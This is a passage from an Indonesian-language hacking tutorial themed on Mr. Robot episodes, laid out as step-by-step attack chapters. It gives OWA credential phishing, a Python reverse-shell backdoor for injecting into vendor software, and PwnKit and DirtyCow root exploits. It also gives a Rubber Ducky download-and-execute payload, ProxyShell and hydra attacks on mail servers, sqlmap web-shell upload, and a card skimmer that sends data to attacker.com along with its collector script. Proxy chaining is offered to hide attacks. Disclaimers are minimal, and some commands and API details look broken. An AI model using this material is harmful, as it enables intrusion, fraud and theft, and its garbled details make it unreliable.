#### **Langkah 6: Kirim Link ke Korban**
- **Email Phishing**:
  ```
  Subject: 🔒 E Corp Security Alert: Verify Your OWA Account
  Body: "Dear Employee, your OWA account has been flagged for suspicious activity. Please verify your credentials immediately."
  Link: http://192.168.1.100
  ```
- **Gunakan ngrok untuk IP publik**:
  ```bash
  ngrok http 80
  # Link: http://abc123.ngrok.io
  ```

---
#### **Langkah 7: View Captured Credentials**
```bash
cat /root/.set/reports/owa_credentials.txt
```
**Output Contoh:**
```
Username: john.doe@ecorp.com
Password: P@ssw0rd123
IP: 192.168.1.100
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan SET** untuk **clone OWA E Corp** dan **mencuri credentials**.

---
### **⚠️ Catatan Penting**
- **OWA biasanya pakai HTTPS** → Gunakan **Evilginx2** untuk **reverse proxy phishing** (lihat Bab 9.1).
- **2FA (Two-Factor Authentication)** bisa **dibypass** dengan **Evilginx2** (capture 2FA token).

---
---
---

---

## **🔹 21. S3E3: Supply Chain Attack**
**Tujuan:** **Mengkompromi vendor/partner** untuk **menyerang target utama**.

---
### **📌 Cara Kerja**
1. **Identifikasi vendor/partner** target (contoh: **pengembang software E Corp**).
2. **Hack vendor** (phishing, exploit, dll).
3. **Modify software/update** vendor untuk **memasukkan backdoor**.
4. **Target utama install software** → **Backdoor aktif**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Backdoor Factory` | Inject backdoor | `git clone https://github.com/secretsquirrel/the-backdoor-factory.git` |
| `Metasploit` | Exploit vendor | `apt install metasploit-framework` |
| `SET` | Phishing vendor | `apt install setoolkit` |
| `GitHub` | Host malicious code | Manual |
| `PyPI` | Host Python package | Manual |

---
### **📝 Step-by-Step**
#### **Langkah 1: Identifikasi Vendor**
```bash
# Cari vendor yang bekerja dengan E Corp
theHarvester -d ecorp.com -b linkedin
```
**Output Contoh:**
```
[+] LinkedIn: John Smith - Software Developer at TechVendor Inc.
```

---
#### **Langkah 2: Hack Vendor (TechVendor Inc.)**
- **Phishing** (lihat Bab 9).
- **Exploit** (lihat Bab 5).

---
#### **Langkah 3: Inject Backdoor ke Software**
**Cara 1: Backdoor Factory (BDF)**
```bash
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory
./backdoor.py -f legitimate_software.exe -H 192.168.1.100 -P 4444 -s reverse_shell_tcp
```
**Penjelasan:**
- `-f legitimate_software.exe` = File software asli.
- `-H 192.168.1.100` = IP attacker.
- `-P 4444` = Port.
- `-s reverse_shell_tcp` = Payload type.

**Output:**
- `backdoored_software.exe` = Software dengan **backdoor**.

---
**Cara 2: Manual Injection (Python)**
```python
# Tambahkan ke script Python vendor
import socket
import subprocess

s = socket.socket()
s.connect(("192.168.1.100", 4444))
s.send(b"[+] Connection from backdoored software")
while True:
    cmd = s.recv(1024).decode()
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
```

---
#### **Langkah 4: Host Backdoored Software**
- **Upload ke GitHub** (seperti update resmi).
- **Gunakan domain palsu** (contoh: `ecorp-updates.com`).
- **Kirim notifikasi update** ke target utama.

---
#### **Langkah 5: Target Utama Install Backdoored Software**
- **Target utama download & install** software.
- **Backdoor connect ke attacker** → **Full access**.

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **mengkompromi vendor E Corp** untuk **menyerang E Corp dari dalam**.

---
### **⚠️ Catatan Penting**
- **Supply Chain Attack sangat efektif** (contoh: **SolarWinds Hack 2020**).
- **Sulit dideteksi** karena **software keliatan legit**.
- **Legal untuk penetration testing** (dengan kontrak).

---
---
---

---

## **🔹 22. S3E4: Metadata Analysis & Steganography**
**Tujuan:** **Menganalisis metadata file** dan **menyembunyikan data di gambar**.

---
### **📌 Metadata Analysis**
**Metadata** = Data tentang file (pengauthor, lokasi, waktu, dll).

---
#### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `exiftool` | Extract metadata | `apt install libimage-exiftool-perl` |
| `mat2` | Metadata Anonymisation | `apt install mat2` |
| `binwalk` | Detect hidden files | `apt install binwalk` |
| `foremost` | Carve files | `apt install foremost` |

---
#### **📝 Step-by-Step**
##### **Langkah 1: Extract Metadata**
```bash
# Foto
exiftool foto.jpg

# PDF
exiftool document.pdf

# MP3
exiftool song.mp3
```
**Output Contoh:**
```
ExifTool Version Number         : 12.40
File Name                       : foto.jpg
Directory                       : .
File Size                       : 2.5 MB
File Modification Date/Time     : 2026:09:14 10:30:45+07:00
File Access Date/Time           : 2026:09:14 10:30:45+07:00
File Creation Date/Time         : 2026:09:14 10:30:45+07:00
Camera Model Name               : iPhone 13
GPS Latitude                    : 6.200000
GPS Longitude                   : 106.816700
GPS Positioning System          : GPS
```
- **GPS Coordinates** = Lokasi foto diambil.

---
##### **Langkah 2: Hapus Metadata**
```bash
# Hapus semua metadata
exiftool -all= foto.jpg

# Atau gunakan mat2
mat2 --inplace foto.jpg
```

---
##### **Langkah 3: Analisis Forensik**
```bash
# Cari file tersembunyi
binwalk foto.jpg

# Extract file tersembunyi
foremost -i foto.jpg -o output/
```
**Output Contoh:**
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
1048576       0x100000        ZIP archive data, at least v2.0 to extract, compressed size: 1024, uncompressed size: 2048, name: "secret.zip"
```

---
### **📌 Steganography**
**Steganography** = **Menyembunyikan data di dalam file** (gambar, audio, video).

---
#### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `steghide` | Hide data in images | `apt install steghide` |
| `Stegsolve` | Analisis steganography | Manual download |
| `binwalk` | Detect hidden data | `apt install binwalk` |
| `zsteg` | Steganography for PNG | `gem install zsteg` |

---
#### **📝 Step-by-Step (Steghide)**
##### **Langkah 1: Sembunyikan File di Gambar**
```bash
steghide embed -cf image.jpg -ef secret.txt -p password123
```
**Penjelasan:**
- `-cf image.jpg` = File gambar (container).
- `-ef secret.txt` = File yang disembunyikan.
- `-p password123` = Password untuk extract.

**Output:**
- `image.jpg` = Gambar dengan **secret.txt tersembunyi**.

---
##### **Langkah 2: Extract File**
```bash
steghide extract -sf image.jpg -p password123
```
**Output:**
- `secret.txt` = File yang disembunyikan.

---
##### **Langkah 3: Analisis dengan Stegsolve**
1. **Download Stegsolve**: [GitHub](https://github.com/RickdeJager/Stegsolve)
2. **Buka gambar** di Stegsolve.
3. **Coba semua filter** (LSB, XOR, dll) untuk **melihat hidden data**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menganalisis metadata** dan **menggunakan steganography** untuk **menyembunyikan data**.

---
### **⚠️ Catatan Penting**
- **Metadata bisa mengungkapkan lokasi, waktu, dan identitas**.
- **Steganography sulit dideteksi** (bukan encryption).
- **Gunakan untuk CTF & forensik**.

---
---
---

---

## **🔹 23. S3E5: Linux Privilege Escalation**
**Tujuan:** **Mendapatkan root access** dari **user biasa** dengan **exploit kernel**.

---
### **📌 Cara Kerja**
1. **Cari vulnerability** di **Linux kernel** (contoh: **DirtyCow, CVE-2021-4034**).
2. **Exploit vulnerability** untuk **dapatkan root shell**.
3. **Gunakan root access** untuk **persistence**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `LinPEAS` | Linux Privilege Escalation Script | `git clone https://github.com/carlospolop/PEASS-ng.git` |
| `Linux Exploit Suggester` | Cari exploit | `git clone https://github.com/mzet-/linux-exploit-suggester.git` |
| `searchsploit` | Cari exploit | `apt install exploitdb` |
| `gcc` | Compile exploit | `apt install gcc` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Enumeration (LinPEAS)**
```bash
# Download LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
**Output Contoh:**
```
[+] SUID Binaries:
/usr/bin/find
/usr/bin/vim
/usr/bin/nmap

[+] Writable Files:
/etc/passwd
/etc/shadow

[+] Cron Jobs:
* * * * * root /tmp/malicious_script.sh
```
- **SUID Binaries** = Binaries yang **bisa dijalankan sebagai root**.
- **Writable Files** = File yang **bisa diedit** (contoh: `/etc/passwd`).
- **Cron Jobs** = **Scheduled tasks** yang **bisa dieksploitasi**.

---
#### **Langkah 2: Cari Exploit Otomatis**
```bash
# Linux Exploit Suggester
git clone https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester
./linux-exploit-suggester.sh
```
**Output Contoh:**
```
[+] Possible Exploits:
1. CVE-2021-4034 (PwnKit) - Local Privilege Escalation
2. CVE-2016-5195 (DirtyCow) - Local Privilege Escalation
3. CVE-2019-14287 (Sudo) - Local Privilege Escalation
```

---
#### **Langkah 3: Exploit CVE-2021-4034 (PwnKit)**
**PwnKit** = **Local Privilege Escalation** di **pkexec** (CVE-2021-4034).

---
##### **Cara 1: Manual Exploit**
```bash
# Download exploit
wget https://github.com/berdav/CVE-2021-4034/raw/main/pwnkit

# Compile
gcc -o pwnkit pwnkit.c

# Jalankan
./pwnkit
```
**Output:**
```
[+] uid=0(root) gid=0(root)
# whoami
root
```

---
##### **Cara 2: Metasploit**
```bash
msfconsole
use exploit/linux/local/pkexec
set SESSION 1  # Jika sudah ada meterpreter session
exploit
```

---
#### **Langkah 4: Exploit DirtyCow (CVE-2016-5195)**
**DirtyCow** = **Race Condition** di **Linux kernel** (memungkinkan **write ke read-only file**).

---
##### **Cara 1: Manual Exploit**
```bash
# Download exploit
wget https://github.com/FireFart/dirtycow/raw/master/dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow
```
**Penjelasan:**
- **Exploit** akan **mengganti `/etc/passwd`** untuk **tambah user root**.
- **Setelah exploit**, login dengan:
  ```bash
  su firefart
  Password: (kosong)
  ```

---
##### **Cara 2: Tambah User ke /etc/passwd**
```bash
# Tambah user baru dengan UID 0 (root)
echo "firefart::0:0:root:/root:/bin/bash" >> /etc/passwd
su firefart
```
**Penjelasan:**
- `0:0` = **UID 0 (root)**.

---
#### **Langkah 5: SUID Binary Exploit**
**Contoh: `/usr/bin/find`**
```bash
# Cek SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit find
find / -exec /bin/sh \; -quit
```
**Penjelasan:**
- `find` dengan **SUID bit** = **bisa dijalankan sebagai root**.
- `-exec /bin/sh` = **Jalankan shell**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan privilege escalation** untuk **mendapatkan root access** di **server E Corp**.

---
### **⚠️ Catatan Penting**
- **Privilege Escalation** = **Dari user biasa → root**.
- **Gunakan LinPEAS** untuk **otomatis enumeration**.
- **Kernel exploit** = **Paling efektif** (jika kernel vulnerable).

---
---
---

---

## **🔹 24. S3E7: USB Rubber Ducky Attack**
**Tujuan:** **Menginjeksikan keystrokes** (seperti keyboard) untuk **menjalankan payload**.

---
### **📌 Cara Kerja**
1. **USB Rubber Ducky** = **Keyboard emulation device**.
2. **Script Ducky** = **Kode yang menentukan keystrokes**.
3. **Korban memasang USB** → **Ducky auto-type payload**.
4. **Payload dijalankan** (reverse shell, download malware, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Harga |
|------|--------|-------|
| **USB Rubber Ducky** | HID Injection | ~$50 |
| **Digispark ATTiny85** | USB HID | ~$10 |
| **DuckEncoder** | Compile script | `git clone https://github.com/akabe/duck2spoon.git` |
| **Hak5** | Official Rubber Ducky | ~$50 |

---
### **📝 Step-by-Step**
#### **Langkah 1: Buat Script Ducky**
**Contoh: Reverse Shell (Windows)**
```
DELAY 3000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```
**Penjelasan:**
- `DELAY 3000` = Tunggu **3 detik** (untuk OS boot).
- `GUI r` = Tekan **Windows Key + R**.
- `STRING cmd` = Ketik `cmd`.
- `ENTER` = Tekan **Enter**.
- `powershell -w hidden -c ...` = **Download & execute payload**.

---
#### **Langkah 2: Compile Script (DuckEncoder)**
```bash
git clone https://github.com/akabe/duck2spoon.git
cd duck2spoon
java -jar duckencode.jar -i script.txt -o inject.bin
```
**Penjelasan:**
- `script.txt` = Script Ducky.
- `inject.bin` = File yang **siap di-flash** ke Rubber Ducky.

---
#### **Langkah 3: Flash ke Rubber Ducky**
1. **Buka Hak5 Rubber Ducky** di **Windows**.
2. **Copy `inject.bin`** ke **microSD Rubber Ducky**.
3. **Pasang microSD** ke Rubber Ducky.

---
#### **Langkah 4: Tinggalkan Rubber Ducky**
- **Tinggalkan di tempat umum** (parkiran, kantor).
- **Korban memasang Rubber Ducky** → **Auto-type payload** → **Reverse shell connect**.

---
### **🎯 Target Nyata di Mr. Robot**
- Darlene **menggunakan Rubber Ducky** untuk **menjalankan payload** di **komputer target**.

---
### **⚠️ Catatan Penting**
- **Rubber Ducky bekerja di semua OS** (Windows, Linux, Mac).
- **Tidak memerlukan autorun** (berbeda dengan USB flash drive).
- **Bisa bypass antivirus** (karena **tidak ada file yang disimpan**).

---
---
---

---

## **🔹 25. S3E9: BitTorrent Tracking**
**Tujuan:** **Melacak dan menganalisis traffic BitTorrent** untuk **mendapatkan informasi**.

---
### **📌 Cara Kerja**
1. **Monitor traffic BitTorrent** di jaringan.
2. **Extract metadata** (IP, file, dll).
3. **Analisis peer list** untuk **mendapatkan info korban**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Wireshark` | Capture traffic | `apt install wireshark` |
| `tcpdump` | Capture traffic (CLI) | `apt install tcpdump` |
| `bittorrent` | BitTorrent client | `apt install bittorrent` |
| `transmission` | BitTorrent client | `apt install transmission` |
| `python-bencode` | Decode bencode | `pip install python-bencode` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Capture Traffic BitTorrent**
```bash
# Capture traffic di port 6881-6889 (BitTorrent)
tcpdump -i wlan0 -w bittorrent.pcap portrange 6881-6889

# Analisis dengan Wireshark
wireshark bittorrent.pcap
```
**Filter Wireshark:**
```
bittorrent
tcp.port == 6881
```

---
#### **Langkah 2: Extract Metadata**
```bash
# Extract IP peers
tcpdump -r bittorrent.pcap -nn -A | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

---
#### **Langkah 3: Buat Torrent Sendiri (Untuk Testing)**
```bash
# Buat torrent file
mktorrent -a http://tracker.com:6969/announce -o file.torrent file.dat
```
**Penjelasan:**
- `-a` = **Announce URL** (tracker).
- `-o` = **Output file** (`file.torrent`).

---
#### **Langkah 4: Seed Torrent**
```bash
transmission-cli -w /path/to/file file.torrent
```
**Penjelasan:**
- **Seed** = **Share file** ke peer lain.

---
#### **Langkah 5: Monitor Peer List**
```python
# Script untuk extract peer list dari .torrent
import bencode
import sys

with open(sys.argv[1], 'rb') as f:
    metadata = bencode.bdecode(f.read())

peers = metadata.get(b'announce-list', [metadata.get(b'announce', b'')])
for peer in peers:
    print(peer.decode())
```
**Cara Pakai:**
```bash
python3 extract_peers.py file.torrent
```

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **menggunakan BitTorrent** untuk **mendistribusikan data** dan **menghindari deteksi**.

---
### **⚠️ Catatan Penting**
- **BitTorrent traffic bisa dianalisis** untuk **melacak user**.
- **Gunakan untuk forensik & investigasi**.
- **Hati-hati dengan hukum** (unduh konten ilegal = ilegal).

---
---
---

---

## **🔹 26. S3E10: Smart TV Hacking**
**Tujuan:** **Mengakses dan mengontrol Smart TV** (Samsung, LG, dll).

---
### **📌 Cara Kerja**
1. **Scan jaringan** untuk **menemukan Smart TV**.
2. **Exploit default credentials** (admin:admin).
3. **Dapatkan akses** ke **API TV**.
4. **Kontrol TV** (matikan, ubah channel, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `nmap` | Scan Smart TV | `apt install nmap` |
| `curl` | HTTP requests | `apt install curl` |
| `wireshark` | Analisis traffic | `apt install wireshark` |
| `metasploit` | Exploit Smart TV | `apt install metasploit-framework` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Scan Jaringan**
```bash
# Scan port umum Smart TV
nmap -p 8000,8001,8080,9090,55000 192.168.1.0/24 -sV
```
**Output Contoh:**
```
192.168.1.50   8000/tcp open  http    Samsung Smart TV
192.168.1.51   8080/tcp open  http    LG WebOS TV
```

---
#### **Langkah 2: Akses Web Interface**
```bash
# Coba akses via browser
http://192.168.1.50:8000

# Atau via curl
curl -v http://192.168.1.50:8000
```
**Default Credentials:**
| Merek | Username | Password |
|-------|----------|----------|
| Samsung | (kosong) | (kosong) |
| LG | admin | 1234 |
| Sony | admin | admin |

---
#### **Langkah 3: Kontrol Samsung Smart TV**
**Samsung Smart TV** menggunakan **HTTP API** untuk kontrol.
```bash
# Matikan TV
curl -X POST http://192.168.1.50:8000/ws/v2/Control/Power -H "Content-Type: application/json" -d '{"action":"off"}'

# Nyalakan TV
curl -X POST http://192.168.1.50:8000/ws/v2/Control/Power -H "Content-Type: application/json" -d '{"action":"on"}'

# Ubah channel
curl -X POST http://192.168.1.50:8000/ws/v2/Control/Channel -H "Content-Type: application/json" -d '{"channel":"10"}'

# Volume up
curl -X POST http://192.168.1.50:8000/ws/v2/Control/Volume -H "Content-Type: application/json" -d '{"action":"up"}'
```

---
#### **Langkah 4: Kontrol LG WebOS TV**
**LG WebOS** menggunakan **WebSocket** untuk kontrol.
```bash
# Dapatkan token
TOKEN=$(curl -s http://192.168.1.51:8080/roap/API/WebSocket | grep -oP '(?<="token":")[^,]+')

# Kirim command (contoh: matikan TV)
curl -X POST "http://192.168.1.51:8080/roap/API/control" -H "Content-Type: application/json" -d '{"id":1,"payload":{"commands":[{"name":"power","value":"off"}]},"type":"request","uri":"ssap://com.webos.service.externalcontrol/control"}'
```

---
#### **Langkah 5: Sniff Traffic TV**
```bash
# Capture traffic TV
tcpdump -i wlan0 host 192.168.1.50 -w tv_traffic.pcap

# Analisis dengan Wireshark
wireshark tv_traffic.pcap
```
**Filter:**
```
http
websocket
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **mengaktifkan microphone Smart TV** untuk **surveillance** di rumah Susan Jacobs.

---
### **⚠️ Catatan Penting**
- **Smart TV sering memiliki keamanan yang buruk** (default credentials, no encryption).
- **Bisa digunakan untuk surveillance** (microphone, camera).
- **Gunakan untuk testing di lab pribadi**.

---
---
---

---

## **🔹 27. S4E1: Email Server Hacking**
**Tujuan:** **Mengakses email server** (Exchange, IMAP, POP3) untuk **mencuri email**.

---
### **📌 Cara Kerja**
1. **Scan email server** (Exchange, IMAP, POP3).
2. **Exploit vulnerability** (contoh: **CVE-2021-34473**).
3. **Brute force credentials**.
4. **Dapatkan akses ke email**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `nmap` | Scan email server | `apt install nmap` |
| `hydra` | Brute force | `apt install hydra` |
| `metasploit` | Exploit | `apt install metasploit-framework` |
| `searchsploit` | Cari exploit | `apt install exploitdb` |
| `proxychains` | Proxy chaining | `apt install proxychains` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Scan Email Server**
```bash
# Scan port email
nmap -p 25,110,143,465,587,993,995 192.168.1.100 -sV
```
**Output Contoh:**
```
25/tcp   open  smtp    Microsoft Exchange
110/tcp  open  pop3    dovecot
143/tcp  open  imap    dovecot
465/tcp  open  smtps   Microsoft Exchange
587/tcp  open  submission Microsoft Exchange
993/tcp  open  imaps   dovecot
995/tcp  open  pop3s   dovecot
```

---
#### **Langkah 2: Exploit Microsoft Exchange (CVE-2021-34473)**
**CVE-2021-34473** = **RCE di Microsoft Exchange** (ProxyShell).

---
##### **Cara 1: Manual Exploit**
```bash
# Download exploit
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# Jalankan Metasploit
msfconsole
use exploit/multi/http/exchange_proxyshell_rce
set RHOSTS 192.168.1.100
set LHOST 192.168.1.100
exploit
```

---
##### **Cara 2: Python Exploit**
```bash
# Download exploit
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD/exploits/ProxyShell
python3 proxyshell.py --target 192.168.1.100 --cmd "whoami"
```
**Output:**
```
[+] Command executed: nt authority\system
```

---
#### **Langkah 3: Brute Force IMAP/POP3**
```bash
# Brute force IMAP
hydra -l user@target.com -P /usr/share/wordlists/rockyou.txt imap://192.168.1.100 -s 143 -S -vV

# Brute force POP3
hydra -l user@target.com -P /usr/share/wordlists/rockyou.txt pop3://192.168.1.100 -s 110 -vV
```

---
#### **Langkah 4: Extract Email (Setelah Akses)**
```bash
# IMAP
openssl s_client -connect 192.168.1.100:993 -crlf
a login user@target.com password
a select INBOX
a fetch 1:* (RFC822)
a quit

# POP3
openssl s_client -connect 192.168.1.100:995 -crlf
user user@target.com
pass password
retr 1
quit
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **meng-hack email server firma hukum** untuk **mendapatkan informasi klien E Corp**.

---
### **⚠️ Catatan Penting**
- **Exchange Server** = **Target utama** (banyak vulnerability).
- **Gunakan Proxychains** untuk **bypass firewall**:
  ```bash
  proxychains hydra -l user@target.com -P rockyou.txt imap://192.168.1.100
  ```

---
---
---

---

## **🔹 28. S4E2: Web Application Hacking (SQL Injection)**
**Tujuan:** **Mengeksploitasi SQL Injection** untuk **mencuri data dari database**.

---
### **📌 Cara Kerja**
1. **Cari input vulnerable** (form login, URL parameter).
2. **Test SQL Injection** (`' OR '1'='1`).
3. **Exploit dengan SQLMap** untuk **dump database**.
4. **Dapatkan data** (username, password, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `sqlmap` | Automated SQLi | `apt install sqlmap` |
| `Burp Suite` | Manual SQLi | Manual install |
| `OWASP ZAP` | Web Scanner | Manual install |
| `nmap` | Scan vulnerability | `apt install nmap` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Deteksi SQL Injection**
**Manual Test:**
- Masukkan di **form login** atau **URL parameter**:
  ```
  ' OR '1'='1
  ' OR 1=1--
  admin' --
  ```
- **Jika error SQL muncul** (contoh: `You have an error in your SQL syntax`) → **Vulnerable!**

**Contoh URL:**
```
http://target.com/login.php?username=admin'--&password=anything
```

---
#### **Langkah 2: Gunakan SQLMap**
```bash
# Deteksi vulnerability
sqlmap -u "http://target.com/login.php?username=test&password=test" --batch

# Dump semua database
sqlmap -u "http://target.com/login.php?username=test&password=test" --dbs --batch

# Dump tabel dari database
sqlmap -u "http://target.com/login.php?username=test&password=test" -D database_name --tables --batch

# Dump data dari tabel
sqlmap -u "http://target.com/login.php?username=test&password=test" -D database_name -T users --dump --batch
```

---
#### **Langkah 3: Bypass WAF (Web Application Firewall)**
```bash
# Gunakan tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --level=5 --risk=3 --batch
```
**Tamper Scripts Populer:**
| Script | Fungsi |
|--------|--------|
| `space2comment` | Ganti spasi dengan komentar SQL |
| `randomcase` | Randomize case keyword SQL |
| `between` | Ganti `>` dengan `BETWEEN` |
| `chardoubleencode` | Double URL encoding |
| `unionall` | Tambah `UNION ALL` |

---
#### **Langkah 4: Blind SQL Injection**
**Jika tidak ada error**, coba **Time-Based Blind SQLi**:
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5 --batch
```
**Penjelasan:**
- `--technique=T` = **Time-Based Blind**.
- `--time-sec=5` = **Delay 5 detik** jika benar.

---
#### **Langkah 5: Second-Order SQL Injection**
**Jika input disimpan di database dan diproses kemudian:**
```bash
sqlmap -u "http://target.com/register" --data="username=test&password=test" --second-url="http://target.com/profile" --batch
```

---
#### **Langkah 6: Upload Web Shell**
```bash
# Upload shell.php
sqlmap -u "http://target.com/upload.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php --batch

# Akses shell
curl http://target.com/shell.php?cmd=id
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan SQL Injection** untuk **mencuri data dari database E Corp**.

---
### **⚠️ Catatan Penting**
- **SQL Injection** = **Salah satu serangan paling umum**.
- **SQLMap otomatis** untuk **dump database**.
- **Gunakan `--batch`** untuk **modus non-interaktif**.

---
---
---

---

## **🔹 29. S4E3: Credit Card Skimming**
**Tujuan:** **Mencuri data kartu kredit** dari **website e-commerce**.

---
### **📌 Cara Kerja**
1. **Temukan website vulnerable** (Magecart, WordPress).
2. **Inject JavaScript skimmer** ke halaman checkout.
3. **Korban memasukkan data kartu kredit** → **Data dikirim ke attacker**.
4. **Attacker menerima data** (nomor kartu, CVV, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Burp Suite` | Intercept & modify traffic | Manual install |
| `BeEF` | Browser Exploitation Framework | `apt install beef-xss` |
| `Magecart` | Skimmer JavaScript | Manual |
| `Wireshark` | Analisis traffic | `apt install wireshark` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Temukan Website Vulnerable**
```bash
# Scan website dengan Burp Suite
# Atau gunakan Google Dork:
site:target.com inurl:checkout
site:target.com inurl:payment
```

---
#### **Langkah 2: Inject Skimmer (Magecart)**
**Contoh Skimmer (JavaScript):**
```javascript
// Skimmer sederhana
document.addEventListener('submit', function(e) {
    if (e.target.id === 'payment-form') {
        var data = {
            card: document.getElementById('card-number').value,
            cvv: document.getElementById('cvv').value,
            name: document.getElementById('card-name').value,
            expiry: document.getElementById('expiry').value
        };
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        });
    }
});
```
**Cara Inject:**
1. **Temukan vulnerability** (XSS, file upload, dll).
2. **Inject skimmer** ke halaman checkout.

---
#### **Langkah 3: Setup Server Penerima**
```bash
# Python server untuk menerima data
python3 -m http.server 8000

# Atau gunakan PHP
cat > steal.php << 'EOF'
<?php
$card = $_POST['card'];
$cvv = $_POST['cvv'];
$name = $_POST['name'];
$expiry = $_POST['expiry'];

file_put_contents('stolen_cards.txt', "Card: $card | CVV: $cvv | Name: $name | Expiry: $expiry\n", FILE_APPEND);
?>
EOF
```

---
#### **Langkah 4: Analisis Skimmer (Forensik)**
```bash
# Cari pattern skimmer
grep -r "fetch\|XMLHttpRequest\|atob\|eval" /var/www/html/

# Decode obfuscated JS
echo "obfuscated_code" | js-beautify
node -e "console.log(atob('BASE64_CODE'))"
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menemukan skimmer kartu kredit** di **website E Corp**.

---
### **⚠️ Catatan Penting**
- **Magecart** = **Kelompok hacker** yang **mencuri data kartu kredit** dari website.
- **Skimmer modern** menggunakan **domain palsu** (contoh: `analytics[.]com`).
- **Gunakan untuk forensik & deteksi**.

---
---
---

---

## **🔹 30. S4E4: Proxy Chaining & Anonymity**
**Tujuan:** **Menyembunyikan jejak** dengan **melalui multiple proxy**.

---
### **📌 Cara Kerja**
1. **Gunakan multiple proxy** (Tor, VPN, SOCKS).
2. **Chain proxy** untuk **menyembunyikan IP asli**.
3. **Lakukan serangan** (scan, exploit) **melalui proxy chain**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `proxychains` | Proxy chaining | `apt install proxychains` |
| `tor` | Anonymity network | `apt install tor` |
| `privoxy` | HTTP proxy | `apt install privoxy` |
| `ssh` | SOCKS proxy | Built-in |
| `i2p` | Invisible Internet Project | `apt install i2p` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Install Proxychains**
```bash
apt install proxychains
```

---
#### **Langkah 2: Konfigurasi Proxychains**
**Edit `/etc/proxychains.conf`:**
```ini
[ProxyList]
# Tor
socks5 127.0.0.1 9050

# VPN
socks5 vpn.provider.com 1080

# Proxy 1
http  proxy1.com 8080

# Proxy 2
socks5 proxy2.com 1080
```
**Penjelasan:**
- **Proxychains** akan **mencoba proxy satu per satu** sampai berhasil.
- **Tor** = **Lapisan pertama** (IP tersembunyi).
- **VPN/Proxy** = **Lapisan tambahan**.

---
#### **Langkah 3: Jalankan Tools Melalui Proxychains**
```bash
# Nmap scan
proxychains nmap -sT -Pn target.com

# SQLMap
proxychains sqlmap -u "http://target.com/page.php?id=1" --dbs

# Hydra
proxychains hydra -l admin -P rockyou.txt ssh://target.com
```

---
#### **Langkah 4: Tor + VPN Double Layer**
**Konsep:**
```
You → Tor → VPN → Target
```
**Cara Setup:**
1. **Jalankan Tor**:
   ```bash
   tor
   ```
2. **Jalankan VPN** (contoh: OpenVPN).
3. **Gunakan Proxychains** dengan **Tor + VPN**:
   ```ini
   [ProxyList]
   socks5 127.0.0.1 9050  # Tor
   socks5 vpn.ip 1080     # VPN
   ```

---
#### **Langkah 5: I2P (Invisible Internet Project)**
**I2P** = **Jaringan anonymity** yang **lebih private** dari Tor.

```bash
# Install I2P
apt install i2p

# Start I2P
i2prouter start

# Akses eepsites (hidden services)
proxychains curl http://bittorrent.i2p
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan proxy chaining** untuk **menyembunyikan jejaknya** saat **menyerang E Corp**.

---
### **⚠️ Catatan Penting**
- **Tor + VPN** = **Lapisan ganda** untuk **anonymity maksimal**.
- **Proxychains** = **Mudah digunakan** untuk **proxy chaining**.
- **Hati-hati dengan exit nodes Tor** (bisa **malicious**).

---
---
---

---

## **🔹 31. S4E5: Zero-Day Exploit**
**Tujuan:** **Mengeksploitasi vulnerability yang belum dipublikasikan** (0-day).

---
### **📌 Cara Kerja**
1. **Cari vulnerability** (fuzzing, reverse engineering).
2. **Develop exploit** (PoC = Proof of Concept).
3. **Gunakan exploit** untuk **dapatkan akses**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `AFL++` | Fuzzing | `apt install afl++` |
| `GDB + PEDA` | Debugging | `apt install gdb peda` |
| `pwntools` | Exploit development | `pip install pwntools` |
